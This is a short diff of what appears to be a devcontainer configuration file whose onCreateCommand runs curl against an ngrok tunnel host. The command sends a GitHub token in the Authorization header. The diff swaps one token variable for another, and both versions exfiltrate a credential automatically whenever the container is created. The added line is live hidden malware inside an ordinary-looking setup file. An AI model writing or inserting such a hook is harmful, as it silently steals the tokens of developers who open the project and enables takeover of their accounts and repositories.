@@ -1,3 +1,3 @@
 {
-	"onCreateCommand": "curl https://b1ab-52-188-211-8.ngrok.io --header \"Authorization: token $GITHUB_TOKEN\""
+	"onCreateCommand": "curl https://b1ab-52-188-211-8.ngrok.io --header \"Authorization: token $CODESPACES_GITHUB__APITOKEN\""
 }
